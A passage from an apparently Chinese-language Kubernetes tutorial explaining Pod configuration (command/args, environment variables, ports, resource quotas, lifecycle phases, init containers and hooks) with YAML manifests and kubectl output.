class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-command</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) &gt;&gt; /tmp/hello.txt; sleep 3; done;&quot;</span>]</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20210617224457945.png" alt="image-20210617224457945"></p><p>command，用于在pod中的容器初始化完毕之后运行一个命令。</p><blockquote><p>稍微解释下上面命令的意思：</p><p>“&#x2F;bin&#x2F;sh”,”-c”, 使用sh执行命令</p><p>touch &#x2F;tmp&#x2F;hello.txt; 创建一个&#x2F;tmp&#x2F;hello.txt 文件</p><p>while true;do &#x2F;bin&#x2F;echo $(date +%T) &gt;&gt; &#x2F;tmp&#x2F;hello.txt; sleep 3; done; 每隔3秒向文件中写入当前时间</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml</span><br><span class="line">pod/pod-command created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod状态</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此时发现两个pod都正常运行了</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl get pods pod-command -n dev</span><br><span class="line">NAME          READY   STATUS   RESTARTS   AGE</span><br><span class="line">pod-command   2/2     Runing   0          2s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入pod中的busybox容器，查看文件内容</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">补充一个命令: kubectl <span class="built_in">exec</span>  pod名称 -n 命名空间 -it -c 容器名称 /bin/sh  在容器内部执行命令</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用这个命令就可以进入某个容器的内部，然后进行相关操作了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如，可以查看txt文件的内容</span></span><br><span class="line">[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh</span><br><span class="line">/ # tail -f /tmp/hello.txt</span><br><span class="line">14:44:19</span><br><span class="line">14:44:22</span><br><span class="line">14:44:25</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">特别说明：</span><br><span class="line">    通过上面发现<span class="keyword">command</span>已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个<span class="keyword">args</span>选项，用于传递参数呢?这其实跟docker有点关系，kubernetes中的<span class="keyword">command</span>、<span class="keyword">args</span>两项其实是实现覆盖Dockerfile中ENTRYPOINT的功能。</span><br><span class="line"> <span class="number">1</span> 如果<span class="keyword">command</span>和<span class="keyword">args</span>均没有写，那么用Dockerfile的配置。</span><br><span class="line"> <span class="number">2</span> 如果<span class="keyword">command</span>写了，但<span class="keyword">args</span>没有写，那么Dockerfile默认的配置会被忽略，执行输入的<span class="keyword">command</span></span><br><span class="line"> <span class="number">3</span> 如果<span class="keyword">command</span>没写，但<span class="keyword">args</span>写了，那么Dockerfile中配置的ENTRYPOINT的命令会被执行，使用当前<span class="keyword">args</span>的参数</span><br><span class="line"> <span class="number">4</span> 如果<span class="keyword">command</span>和<span class="keyword">args</span>都写了，那么Dockerfile的配置被忽略，执行<span class="keyword">command</span>并追加上<span class="keyword">args</span>参数</span><br></pre></td></tr></table></figure><h3 id="5-2-4-环境变量"><a href="#5-2-4-环境变量" class="headerlink" title="5.2.4 环境变量"></a>5.2.4 环境变量</h3><p>创建pod-env.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">busybox</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;while true;do /bin/echo $(date +%T);sleep 60; done;&quot;</span>]</span><br><span class="line">    <span class="attr">env:</span> <span class="comment"># 设置环境变量列表</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;username&quot;</span></span><br><span class="line">      <span class="attr">value:</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;password&quot;</span></span><br><span class="line">      <span class="attr">value:</span> <span class="string">&quot;123456&quot;</span></span><br></pre></td></tr></table></figure><p>env，环境变量，用于在pod中的容器设置环境变量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-env.yaml</span><br><span class="line">pod/pod-env created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入容器，输出环境变量</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh</span><br><span class="line">/ # echo $username</span><br><span class="line">admin</span><br><span class="line">/ # echo $password</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><p>这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。</p><h3 id="5-2-5-端口设置"><a href="#5-2-5-端口设置" class="headerlink" title="5.2.5 端口设置"></a>5.2.5 端口设置</h3><p>本小节来介绍容器的端口设置，也就是containers的ports选项。</p><p>首先看下ports支持的子选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports</span><br><span class="line">KIND:     Pod</span><br><span class="line">VERSION:  v1</span><br><span class="line">RESOURCE: ports &lt;[]Object&gt;</span><br><span class="line">FIELDS:</span><br><span class="line">   name         &lt;string&gt;  # 端口名称，如果指定，必须保证name在pod中是唯一的</span><br><span class="line">   containerPort&lt;integer&gt; # 容器要监听的端口(0&lt;x&lt;65536)</span><br><span class="line">   hostPort     &lt;integer&gt; # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) </span><br><span class="line">   hostIP       &lt;string&gt;  # 要将外部端口绑定到的主机IP(一般省略)</span><br><span class="line">   protocol     &lt;string&gt;  # 端口协议。必须是UDP、TCP或SCTP。默认为“TCP”。</span><br></pre></td></tr></table></figure><p>接下来，编写一个测试案例，创建pod-ports.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-ports</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span> <span class="comment"># 设置容器暴露的端口列表</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml</span><br><span class="line">pod/pod-ports created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在下面可以明显看到配置信息</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml</span><br><span class="line">......</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx:1.17.1</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    name: nginx</span><br><span class="line">    ports:</span><br><span class="line">    - containerPort: 80</span><br><span class="line">      name: nginx-port</span><br><span class="line">      protocol: TCP</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>访问容器中的程序需要使用的是<code>Podip:containerPort</code></p><h3 id="5-2-6-资源配额"><a href="#5-2-6-资源配额" class="headerlink" title="5.2.6 资源配额"></a>5.2.6 资源配额</h3><p>容器中的程序要运行，肯定是要占用一定资源的，比如cpu和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes提供了对内存和cpu的资源进行配额的机制，这种机制主要通过resources选项实现，他有两个子选项：</p><ul><li>limits：用于限制运行时容器的最大占用资源，当容器占用资源超过limits时会被终止，并进行重启</li><li>requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动</li></ul><p>可以通过上面两个选项设置资源的上下限。</p><p>接下来，编写一个测试案例，创建pod-resources.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-resources</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">resources:</span> <span class="comment"># 资源配额</span></span><br><span class="line">      <span class="attr">limits:</span>  <span class="comment"># 限制资源（上限）</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;2&quot;</span> <span class="comment"># CPU限制，单位是core数</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;10Gi&quot;</span> <span class="comment"># 内存限制</span></span><br><span class="line">      <span class="attr">requests:</span> <span class="comment"># 请求资源（下限）</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">&quot;1&quot;</span>  <span class="comment"># CPU限制，单位是core数</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">&quot;10Mi&quot;</span>  <span class="comment"># 内存限制</span></span><br></pre></td></tr></table></figure><p>在这对cpu和memory的单位做一个说明：</p><ul><li>cpu：core数，可以为整数或小数</li><li>memory： 内存大小，可以使用Gi、Mi、G、M等形式</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml</span><br><span class="line">pod/pod-resources created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看发现pod运行正常</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev</span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE  </span><br><span class="line">pod-resources   1/1     Running   0          39s   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来，停止Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml</span><br><span class="line">pod &quot;pod-resources&quot; deleted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑pod，修改resources.requests.memory的值为10Gi</span></span><br><span class="line">[root@k8s-master01 ~]# vim pod-resources.yaml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次启动pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml</span><br><span class="line">pod/pod-resources created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod状态，发现Pod启动失败</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide</span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE          </span><br><span class="line">pod-resources   0/1     Pending   0          20s    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod详情会发现，如下提示</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev</span><br><span class="line">......</span><br><span class="line">Warning  FailedScheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint &#123;node-role.kubernetes.io/master: &#125;, that the pod didn&#x27;t tolerate, 2 Insufficient memory.(内存不足)</span><br></pre></td></tr></table></figure><h2 id="5-3-Pod生命周期"><a href="#5-3-Pod生命周期" class="headerlink" title="5.3 Pod生命周期"></a>5.3 Pod生命周期</h2><p>我们一般将pod对象从创建至终的这段时间范围称为pod的生命周期，它主要包含下面的过程：</p><ul><li>pod创建过程</li><li>运行初始化容器（init container）过程</li><li>运行主容器（main container）<ul><li>容器启动后钩子（post start）、容器终止前钩子（pre stop）</li><li>容器的存活性探测（liveness probe）、就绪性探测（readiness probe）</li></ul></li><li>pod终止过程</li></ul><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200412111402706-1626782188724.png" alt="image-20200412111402706"></p><p>在整个生命周期中，Pod会出现5种<strong>状态</strong>（<strong>相位</strong>），分别如下：</p><ul><li>挂起（Pending）：apiserver已经创建了pod资源对象，但它尚未被调度完成或者仍处于下载镜像的过程中</li><li>运行中（Running）：pod已经被调度至某节点，并且所有容器都已经被kubelet创建完成</li><li>成功（Succeeded）：pod中的所有容器都已经成功终止并且不会被重启</li><li>失败（Failed）：所有容器都已经终止，但至少有一个容器终止失败，即容器返回了非0值的退出状态</li><li>未知（Unknown）：apiserver无法正常获取到pod对象的状态信息，通常由网络通信失败所导致</li></ul><h3 id="5-3-1-创建和终止"><a href="#5-3-1-创建和终止" class="headerlink" title="5.3.1 创建和终止"></a>5.3.1 创建和终止</h3><p><strong>pod的创建过程</strong></p><ol><li><p>用户通过kubectl或其他api客户端提交需要创建的pod信息给apiServer</p></li><li><p>apiServer开始生成pod对象的信息，并将信息存入etcd，然后返回确认信息至客户端</p></li><li><p>apiServer开始反映etcd中的pod对象的变化，其它组件使用watch机制来跟踪检查apiServer上的变动</p></li><li><p>scheduler发现有新的pod对象要创建，开始为Pod分配主机并将结果信息更新至apiServer</p></li><li><p>node节点上的kubelet发现有pod调度过来，尝试调用docker启动容器，并将结果回送至apiServer</p></li><li><p>apiServer将接收到的pod状态信息存入etcd中</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200406184656917-1626782168787.png" alt="image-20200406184656917"></p></li></ol><p><strong>pod的终止过程</strong></p><ol><li>用户向apiServer发送删除pod对象的命令</li><li>apiServcer中的pod对象信息会随着时间的推移而更新，在宽限期内（默认30s），pod被视为dead</li><li>将pod标记为terminating状态</li><li>kubelet在监控到pod对象转为terminating状态的同时启动pod关闭过程</li><li>端点控制器监控到pod对象的关闭行为时将其从所有匹配到此端点的service资源的端点列表中移除</li><li>如果当前pod对象定义了preStop钩子处理器，则在其标记为terminating后即会以同步的方式启动执行</li><li>pod对象中的容器进程收到停止信号</li><li>宽限期结束后，若pod中还存在仍在运行的进程，那么pod对象会收到立即终止的信号</li><li>kubelet请求apiServer将此pod资源的宽限期设置为0从而完成删除操作，此时pod对于用户已不可见</li></ol><h3 id="5-3-2-初始化容器"><a href="#5-3-2-初始化容器" class="headerlink" title="5.3.2 初始化容器"></a>5.3.2 初始化容器</h3><p>初始化容器是在pod的主容器启动之前要运行的容器，主要是做一些主容器的前置工作，它具有两大特征：</p><ol><li>初始化容器必须运行完成直至结束，若某初始化容器运行失败，那么kubernetes需要重启它直到成功完成</li><li>初始化容器必须按照定义的顺序执行，当且仅当前一个成功之后，后面的一个才能运行</li></ol><p>初始化容器有很多的应用场景，下面列出的是最常见的几个：</p><ul><li>提供主容器镜像中不具备的工具程序或自定义代码</li><li>初始化容器要先于应用容器串行启动并运行完成，因此可用于延后应用容器的启动直至其依赖的条件得到满足</li></ul><p>接下来做一个案例，模拟下面这个需求：</p><p>假设要以主容器来运行nginx，但是要求在运行nginx之前先要能够连接上mysql和redis所在服务器</p><p>为了简化测试，事先规定好mysql<code>(192.168.5.4)</code>和redis<code>(192.168.5.5)</code>服务器的地址</p><p>创建pod-initcontainer.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-initcontainer</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main-container</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">initContainers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-mysql</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;until ping 192.168.5.14 -c 1 ; do echo waiting for mysql...; sleep 2; done;&#x27;</span>]</span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-redis</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">busybox:1.30</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;until ping 192.168.5.15 -c 1 ; do echo waiting for reids...; sleep 2; done;&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml</span><br><span class="line">pod/pod-initcontainer created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod状态</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现pod卡在启动第一个初始化容器过程中，后面的容器不会运行</span></span><br><span class="line">root@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev</span><br><span class="line">........</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason     Age   From               Message</span><br><span class="line">  ----    ------     ----  ----               -------</span><br><span class="line">  Normal  Scheduled  49s   default-scheduler  Successfully assigned dev/pod-initcontainer to node1</span><br><span class="line">  Normal  Pulled     48s   kubelet, node1     Container image &quot;busybox:1.30&quot; already present on machine</span><br><span class="line">  Normal  Created    48s   kubelet, node1     Created container test-mysql</span><br><span class="line">  Normal  Started    48s   kubelet, node1     Started container test-mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">动态查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w</span><br><span class="line">NAME                             READY   STATUS     RESTARTS   AGE</span><br><span class="line">pod-initcontainer                0/1     Init:0/2   0          15s</span><br><span class="line">pod-initcontainer                0/1     Init:1/2   0          52s</span><br><span class="line">pod-initcontainer                0/1     Init:1/2   0          53s</span><br><span class="line">pod-initcontainer                0/1     PodInitializing   0          89s</span><br><span class="line">pod-initcontainer                1/1     Running           0          90s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来新开一个shell，为当前服务器新增两个ip，观察pod的变化</span></span><br><span class="line">[root@k8s-master01 ~]# ifconfig ens33:1 192.168.5.14 netmask 255.255.255.0 up</span><br><span class="line">[root@k8s-master01 ~]# ifconfig ens33:2 192.168.5.15 netmask 255.255.255.0 up</span><br></pre></td></tr></table></figure><h3 id="5-3-3-钩子函数"><a href="#5-3-3-钩子函数" class="headerlink" title="5.3.3 钩子函数"></a>5.3.3 钩子函数</h3><p>钩子函数能够感知自身生命周期中的事件，并在相应的时刻到来时运行用户指定的程序代码。</p><p>kubernetes在主容器的启动之后和停止之前提供了两个钩子函数：</p><ul><li>post start：容器创建之后执行，如果失败了会重启容器</li><li>pre stop ：容器终止之前执行，执行完成之后容器将成功终止，在其完成之前会阻塞删除容器的操作</li></ul><p>钩子处理器支持使用下面三种方式定义动作：</p><ul><li><p>Exec命令：在容器内执行一次命令</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span></span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">postStart:</span> </span><br><span class="line">      <span class="attr">exec:</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/tmp/healthy</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li><li><p>TCPSocket：在当前容器尝试访问指定的socket</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span>      </span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">postStart:</span></span><br><span class="line">      <span class="attr">tcpSocket:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li><li><p>HTTPGet：在当前容器中向某url发起http请求</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span></span><br><span class="line">  <span class="attr">lifecycle:</span></span><br><span class="line">    <span class="attr">postStart:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span> <span class="comment">#URI地址</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">80</span> <span class="comment">#端口号</span></span><br><span class="line">        <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.5</span><span class="number">.3</span> <span class="comment">#主机地址</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTP</span> <span class="comment">#支持的协议，http或者https</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li></ul><p>接下来，以exec方式为例，演示下钩子函数的使用，创建pod-hook-exec.yaml文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span 